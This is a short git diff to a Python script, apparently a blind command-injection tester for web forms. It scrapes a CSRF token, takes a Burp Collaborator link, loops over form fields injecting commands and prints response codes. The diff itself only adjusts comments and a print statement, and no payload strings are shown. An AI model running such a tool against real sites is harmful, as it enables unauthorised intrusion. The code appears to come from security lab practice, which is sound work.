@@ -18,6 +18,7 @@ def cmd_inj(url):
     soup = BeautifulSoup(r.text, 'html.parser')
     csrf = soup.find("input")['value']
 
+    # Use to input data if preferred
     #data = dict()
     #keys = int(input('Number of data parameters? '))
     #for i in range(0,keys):
@@ -35,9 +36,7 @@ def cmd_inj(url):
       'subject':'asdf',
       'message':'asdf'
     }
-    #file = 1
-    #f = open('./blind_redirection.txt','w+')
-
+    
     collab_link = input('Enter Burp collaborator link: ')
 
     for k in data:
@@ -62,7 +61,7 @@ def cmd_inj(url):
                 print(f"{k} - {cmd} returned {r_1.status_code}")
                                
                 data[k] = data[k].replace(f'{cmd}','')
-                print(data)      
+                #print(data)      
 
 if __name__ == "__main__":
     try:
